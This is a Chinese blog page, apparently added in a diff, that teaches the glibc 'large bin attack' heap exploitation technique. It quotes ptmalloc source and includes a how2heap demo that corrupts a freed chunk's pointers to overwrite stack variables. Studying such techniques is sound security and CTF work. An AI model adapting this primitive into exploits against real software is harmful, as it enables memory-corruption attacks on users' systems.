@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <title>
+        
+          large bin attack - hello word
+        
+    </title>
+
+    <link rel="canonical" href="http://yoursite-url/2019/06/24/large-bin-attack/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS --> 
+    <link rel="stylesheet" href="/css/beantech.min.css">
+    
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <link rel="stylesheet" href="/css/widget.css">
+
+    <link rel="stylesheet" href="/css/rocket.css">
+
+    <link rel="stylesheet" href="/css/signature.css">
+
+    <link rel="stylesheet" href="/css/toc.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            background-image: url('wallhaven-89081.jpg')
+            /*post*/
+        
+    }
+    
+    #signature{
+        background-image: url('/img/signature/BeanTechSign-white.png');
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#PWN" title="PWN">PWN</a>
+                            
+                        </div>
+                        <h1>large bin attack</h1>
+                        <h2 class="subheading"></h2>
+                        <span class="meta">
+                            Posted by 骑猪满天飞 on
+                            2019-06-24
+                        </span>
+                    </div>
+                
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Hello Word</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Modify by Yu-Hsuan Yen -->
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1><span id="large-bin-attack">large bin attack</span></h1>
+<p>large bins 中的每一个 bin 分别包含了一个给定范围内的 chunk，其中的 chunk 按大小序排列。相同大小的 chunk 同样按照最近使用顺序排列。 ptmalloc 使用“smallest-first，best-fit”原则在空闲 large bins 中查找合适的 chunk。</p>
+<p>与其他bin不同，large bin 包含了fd_nextsize和bk_nextsize来加快检索速度。</p>
+<p><img src="Image.png" alt="3c7beefe8737a323b8f638e8c1843c8a.png"></p>
+<h2><span id="large-bin特点">large bin特点</span></h2>
+<p>在同一个large bin中</p>
+<ul>
+<li>1.chunk按照从大到小的顺序排序。</li>
+<li>2.大小相同的chunk按照free时间排序。</li>
+<li>3.大小相同的chunk，只有首个chunk的fd_nextsize和bk_nextsize会指向其他chunk，相同大小的其他chunk中fd_nextsize和bk_nextsize为0。</li>
+<li>4.size最大的chunk的bk_nextsize指向最小的chunk，最小的chunk的fd_nextsize指向最大的chunk。</li>
+</ul>
+<h2><span id="large-bin-相关源码">large bin 相关源码</span></h2>
+<p>与large bin实现相关的代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))&#123;</span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    if (__builtin_expect (chunksize_nomask (victim) &lt;= 2 * SIZE_SZ, 0)</span><br><span class="line">        || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">                   &gt; av-&gt;system_mem, 0))</span><br><span class="line">            malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">    size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">    /*      If a small request, try to use last remainder if it is the      only chunk in unsorted bin.  This helps promote locality for      runs of consecutive small requests. This is the only      exception to best-fit, and applies only when there is      no exact fit for a small chunk.    */</span><br><span class="line"></span><br><span class="line">    if (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">        bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">        victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">        (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">        /* split and reattach remainder */</span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        remainder = chunk_at_offset (victim, nb);</span><br><span class="line">        unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">        av-&gt;last_remainder = remainder;</span><br><span class="line">        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">        if (!in_smallbin_range (remainder_size))</span><br><span class="line">        &#123;</span><br><span class="line">            remainder-&gt;fd_nextsize = NULL;</span><br><span class="line">            remainder-&gt;bk_nextsize = NULL;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                  (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">        set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        void *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        return p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* remove from unsorted list */</span><br><span class="line">    unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">    bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">    /* Take now instead of binning if exact fit */</span><br><span class="line"></span><br><span class="line">    if (size == nb)</span><br><span class="line">    &#123;</span><br><span class="line">         set_inuse_bit_at_offset (victim, size);</span><br><span class="line">         if (av != &amp;main_arena)</span><br><span class="line">             set_non_main_arena (victim);</span><br><span class="line">         check_malloced_chunk (av, victim, nb);</span><br><span class="line">         void *p = chunk2mem (victim);</span><br><span class="line">         alloc_perturb (p, bytes);</span><br><span class="line">         return p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* place chunk in bin */</span><br><span class="line">    if (in_smallbin_range (size))</span><br><span class="line">    &#123;</span><br><span class="line">        victim_index = smallbin_index (size);</span><br><span class="line">        bck = bin_at (av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        victim_index = largebin_index (size);</span><br><span class="line">        bck = bin_at (av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">        /* maintain large bins in sorted order */</span><br><span class="line">        if (fwd != bck)</span><br><span class="line">        &#123;</span><br><span class="line">             /* Or with inuse bit to speed comparisons */</span><br><span class="line">             size |= PREV_INUSE;</span><br><span class="line">             /* if smaller than smallest, bypass loop below */</span><br><span class="line">             assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">             if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">             &#123;</span><br><span class="line">                 fwd = bck;</span><br><span class="line">                 bck = bck-&gt;bk;</span><br><span class="line">                 victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                 victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                 fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">              &#125;</span><br><span class="line">              else</span><br><span class="line">              &#123;</span><br><span class="line">                  assert (chunk_main_arena (fwd));</span><br><span class="line">                  while ((unsigned long) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                  &#123;</span><br><span class="line">                      fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                      assert (chunk_main_arena (fwd));</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line">                  if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))</span><br><span class="line">                        /* Always insert in the second position.  */</span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                  else</span><br><span class="line">                  &#123;</span><br><span class="line">                      victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                      victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                  &#125;</span><br><span class="line">                  bck = fwd-&gt;bk;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">              victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mark_bin (av, victim_index);</span><br><span class="line">    victim-&gt;bk = bck;</span><br><span class="line">    victim-&gt;fd = fwd;</span><br><span class="line">    fwd-&gt;bk = victim;</span><br><span class="line">    bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>
+<h3><span id="源码解析">源码解析</span></h3>
+<p>每次循环都将搜索整个unsorted bin是否存在可用chunk，若没有则结束循环。<br>
+当chunk大小在large bin 范围时，进入chunk插入large bin的步骤：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (fwd != bck)</span><br><span class="line">&#123;</span><br><span class="line">   ~~~~~~~~~~~~       </span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br></pre></td></tr></table></figure>
+<p>1.若large bin为空，则设置chunk的fd_nextsize、bk_nextsize为自身：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">else</span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br></pre></td></tr></table></figure>
+<p>2.若large bin不为空，且chunk的大小小于large bin中最小的块，将chunk插入到large bin的最后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) </span><br><span class="line">&#123;</span><br><span class="line">    fwd = bck; </span><br><span class="line">    bck = bck-&gt;bk; </span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd; </span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>3.否则从头遍历large bin找到第一个等于或者小于chunk size的块：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">while ((unsigned long) size &lt; chunksize_nomask (fwd))</span><br><span class="line">  &#123;</span><br><span class="line">      fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">      assert (chunk_main_arena (fwd));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>若此块大小等于待插入的chunk大小，根据大小相同的chunk，只有首个chunk的fd_nextsize和bk_nextsize会指向其他chunk，相同大小的其他chunk中fd_nextsize和bk_nextsize为0。所以没有对fd_nextsize、bk_nextsize赋值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd)) </span><br><span class="line">/* Always insert in the second position. */ </span><br><span class="line">fwd = fwd-&gt;fd;</span><br></pre></td></tr></table></figure>
+<p>如果不相等，说明待插入的chunk比当前堆块的size 大，那么我们将待插入的chunk插入到此堆块后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">else &#123;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd; </span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; </span><br><span class="line">    fwd-&gt;bk_nextsize = victim; </span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<h1><span id="how2heap-large-bin-attck">how2heap large bin attck</span></h1>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    fprintf(stderr, &quot;This technique only works with disabled tcache-option for glibc, see glibc_build.sh for build instructions.\n&quot;);</span><br><span class="line">    fprintf(stderr, &quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;);</span><br><span class="line">    fprintf(stderr, &quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span><br><span class="line">           &quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    unsigned long stack_var1 = 0;</span><br><span class="line">    unsigned long stack_var2 = 0;</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, &quot;Let&apos;s first look at the targets we want to rewrite on stack:\n&quot;);</span><br><span class="line">    fprintf(stderr, &quot;stack_var1 (%p): %ld\n&quot;, &amp;stack_var1, stack_var1);</span><br><span class="line">    fprintf(stderr, &quot;stack_var2 (%p): %ld\n\n&quot;, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    unsigned long *p1 = malloc(0x320);</span><br><span class="line">    fprintf(stderr, &quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;, p1 - 2);</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, &quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span><br><span class="line">           &quot; the first large chunk during the free()\n\n&quot;);</span><br><span class="line">    malloc(0x20);</span><br><span class="line"></span><br><span class="line">    unsigned long *p2 = malloc(0x400);</span><br><span class="line">    fprintf(stderr, &quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;, p2 - 2);</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, &quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span><br><span class="line">           &quot; the second large chunk during the free()\n\n&quot;);</span><br><span class="line">    malloc(0x20);</span><br><span class="line"></span><br><span class="line">    unsigned long *p3 = malloc(0x400);</span><br><span class="line">    fprintf(stderr, &quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;, p3 - 2);</span><br><span class="line"> </span><br><span class="line">    fprintf(stderr, &quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span><br><span class="line">           &quot; the third large chunk during the free()\n\n&quot;);</span><br><span class="line">    malloc(0x20);</span><br><span class="line"> </span><br><span class="line">    free(p1);</span><br><span class="line">    free(p2);</span><br><span class="line">    fprintf(stderr, &quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span><br><span class="line">           &quot; [ %p &lt;--&gt; %p ]\n\n&quot;, (void *)(p2 - 2), (void *)(p2[0]));</span><br><span class="line"></span><br><span class="line">    malloc(0x90);</span><br><span class="line">    fprintf(stderr, &quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span><br><span class="line">            &quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span><br><span class="line">            &quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span><br><span class="line">            &quot; [ %p ]\n\n&quot;, (void *)((char *)p1 + 0x90));</span><br><span class="line"></span><br><span class="line">    free(p3);</span><br><span class="line">    fprintf(stderr, &quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span><br><span class="line">           &quot; [ %p &lt;--&gt; %p ]\n\n&quot;, (void *)(p3 - 2), (void *)(p3[0]));</span><br><span class="line"> </span><br><span class="line">    //------------VULNERABILITY-----------</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the freed second large chunk&apos;s \&quot;size\&quot;&quot;</span><br><span class="line">            &quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;);</span><br><span class="line">    fprintf(stderr, &quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span><br><span class="line">            &quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span><br><span class="line">            &quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    p2[-1] = 0x3f1;</span><br><span class="line">    p2[0] = 0;</span><br><span class="line">    p2[2] = 0;</span><br><span class="line">    p2[1] = (unsigned long)(&amp;stack_var1 - 2);</span><br><span class="line">    p2[3] = (unsigned long)(&amp;stack_var2 - 4);</span><br><span class="line"></span><br><span class="line">    //------------------------------------</span><br><span class="line"></span><br><span class="line">    malloc(0x90);</span><br><span class="line"> </span><br><span class="line">    fprintf(stderr, &quot;Let&apos;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span><br><span class="line">            &quot; During this time, targets should have already been rewritten:\n&quot;);</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, &quot;stack_var1 (%p): %p\n&quot;, &amp;stack_var1, (void *)stack_var1);</span><br><span class="line">    fprintf(stderr, &quot;stack_var2 (%p): %p\n&quot;, &amp;stack_var2, (void *)stack_var2);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上述程序展示了通过large bin attack修改栈上的变量值。</p>
+<ul>
+<li>1.设置：stack_var1 、stack_var2 的值都为0。申请三个大小分别为0x320、0x400、0x400的三个堆块p1、p2、p3。为防止free这3个堆块时前后堆块之间的合并，申请p1、p2、p3后分别申请了属于fastbin大小为0x20的堆块。</li>
+</ul>
+<ul>
+<li>2.free掉p1、p2后p1、p2进入unsorted bin<br>
+gdb调试如下：</li>
+</ul>
+<p><img src="Image1.png" alt="Image1.png"></p>
+<ul>
+<li>3.当malloc(0x90)时，p1被分割为两块一块为0x90剩下的留在unsort bin中。p2从unsorted bin中进入large bin<br>
+<img src="Image2.png" alt="a24288c1890490e187f925e10f23956c.png"><br>
+free(p3)，p3进入unsorted bin。</li>
+<li>4.通过伪造p2修改栈上变量值：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p2[-1] = 0x3f1;</span><br><span class="line">p2[0] = 0;</span><br><span class="line">p2[2] = 0;</span><br><span class="line">p2[1] = (unsigned long)(&amp;stack_var1 - 2);</span><br><span class="line">p2[3] = (unsigned long)(&amp;stack_var2 - 4);</span><br></pre></td></tr></table></figure>
+<p>此时的p2堆结构：<br>
+<img src="Image3.png" alt="c90b0f0dc52c24128ebf9e0a6b5f8149.png"></p>
+<ul>
+<li>5.再次malloc(0x90)，p3会从unsorted进入large bin。此时p2在large bin中，large bin不为空，且p2大小伪造为0x3f1小于p3，所以进入以下代码：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">else &#123;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd; </span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; </span><br><span class="line">    fwd-&gt;bk_nextsize = victim; </span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>victim对应p3，fwd对应p2。成功修改stack_var1、stack_var2的值。</p>
+<h2><span id="参考文章">参考文章：</span></h2>
+<p><a href="https://xz.aliyun.com/t/5177" target="_blank" rel="noopener">浅析largebin attack</a><br>
+<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/large_bin_attack/#0x1-how2heaplarge_bin_attack" target="_blank" rel="noopener">ctf wiki</a></p>
+
+                
+
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                    
+                        <li class="next">
+                            <a href="/2019/06/22/UPnP协议利用/" data-toggle="tooltip" data-placement="top" title="UPnP协议利用">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                <!-- duoshuo Share start -->
+                
+                <!-- 多说 Share end-->
+
+                <!-- 多说评论框 start -->
+                
+                <!-- 多说评论框 end -->
+
+                <!-- disqus comment start -->
+                
+                    <div class="comment">
+                        <div id="disqus_thread" class="disqus-thread"></div>
+                    </div>
+                
+                <!-- disqus comment end -->
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+    
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
